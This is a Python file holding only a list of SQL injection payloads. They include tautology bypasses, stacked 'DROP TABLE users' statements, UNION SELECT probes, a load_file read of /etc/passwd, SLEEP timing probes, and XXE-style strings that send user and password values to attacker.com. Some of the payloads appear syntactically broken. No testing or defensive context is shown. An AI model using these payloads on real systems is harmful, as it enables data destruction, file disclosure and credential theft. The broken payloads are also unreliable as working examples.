# -*- coding: utf-8 -*-
sql_payloads = [
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' #",
    "1; DROP TABLE users;",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "1' OR 'a'='a",
    "1) OR ('a'='a",
    "1' OR 'a'='a' --",
    "1' OR 'a'='a' #",
    "1; DROP TABLE users--",

    "1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
    "1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL #",
    "' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
    "' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL #",
    "1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
    "' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",

    "1; CREATE TEMPORARY TABLE test AS SELECT 1,2,3 --",
    "' OR 'x'='x'; CREATE TEMPORARY TABLE test AS SELECT 1,2,3 --",

    "1; SELECT load_file('/etc/passwd') --",
    "' OR 'x'='x'; SELECT load_file('/etc/passwd') --",

    "' OR SLEEP(5) --",
    "' OR 'a'='a' AND SLEEP(5) --",
    "' OR 'a'='a' AND 'b'='b' AND SLEEP(5) --",

    "1' OR 1=1; SELECT 1/0 --",
    "' OR 1=1; SELECT 1/0 --",

    "1'; CALL xmltype('<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'http://attacker.com/collect?data='||user()||'&pwd='||pass()>]>') --",
    "' OR 1=1; CALL xmltype('<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'http://attacker.com/collect?data='||user()||'&pwd='||pass()>]>') --",
]
